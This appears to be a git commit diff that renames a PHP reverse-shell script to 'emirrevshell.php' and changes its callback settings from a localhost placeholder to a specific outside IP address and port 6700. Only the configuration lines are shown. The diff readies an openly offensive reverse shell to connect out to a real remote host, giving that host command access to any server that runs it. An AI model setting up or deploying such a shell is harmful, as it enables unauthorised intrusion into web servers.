eb6dbc6886e31b91633eb15d368789d5e097d16d
EmirVildanov <emirvildanow@gmail.com>
2022-10-31 14:25:29 +0300

    Update and rename php-reverse-shell.php to emirrevshell.php

--- emirrevshell.php
+++ emirrevshell.php
@@ -46,8 +46,8 @@
 
 set_time_limit (0);
 $VERSION = "1.0";
-$ip = '127.0.0.1';  // CHANGE THIS
-$port = 1234;       // CHANGE THIS
+$ip = '178.154.204.228';  // CHANGE THIS
+$port = 6700;       // CHANGE THIS
 $chunk_size = 1400;
 $write_a = null;
 $error_a = null;
